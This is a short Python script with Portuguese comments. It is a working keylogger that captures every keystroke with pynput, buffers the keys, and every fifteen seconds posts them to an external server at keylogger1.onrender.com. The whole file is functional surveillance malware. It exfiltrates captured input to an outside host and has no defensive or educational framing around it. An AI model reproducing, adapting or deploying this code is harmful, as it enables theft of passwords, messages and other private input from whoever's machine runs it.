from pynput.keyboard import Key, Listener
import requests
import threading
import time

# --- CONFIGURAÇÃO ---
SERVER_URL = "https://keylogger1.onrender.com/receber_dados"
buffer_nuvem = ""
lock = threading.Lock()

print("--- MONITORAMENTO ATIVO ---")

def enviar_para_nuvem():
    global buffer_nuvem # Global sempre no topo da função
    while True:
        dados_para_enviar = ""
        
        with lock:
            if buffer_nuvem:
                dados_para_enviar = buffer_nuvem
        
        if dados_para_enviar:
            try:
                res = requests.post(SERVER_URL, data={'keylogs': dados_para_enviar}, timeout=15)
                if res.status_code == 200:
                    with lock:
                        # Remove apenas o que foi enviado com sucesso
                        buffer_nuvem = buffer_nuvem[len(dados_para_enviar):]
                    print(f"\n[SUCESSO] Dados enviados ao Render.")
            except Exception as e:
                print(f"\n[AGUARDANDO] Servidor offline ou acordando...")
        
        time.sleep(15)

def on_press(key):
    global buffer_nuvem # Global sempre no topo da função
    try:
        if hasattr(key, 'char') and key.char is not None:
            tecla = key.char
        elif key == Key.space:
            tecla = " "
        elif key == Key.enter:
            tecla = "\n"
        elif key == Key.backspace:
            tecla = "[BACK]"
        else:
            tecla = f"[{str(key).replace('Key.', '')}]"

        with lock:
            buffer_nuvem += tecla
        
        print(tecla, end='', flush=True)
    except Exception:
        pass

# Inicia a thread de envio
threading.Thread(target=enviar_para_nuvem, daemon=True).start()

# Inicia a escuta
with Listener(on_press=on_press) as listener:
    listener.join()
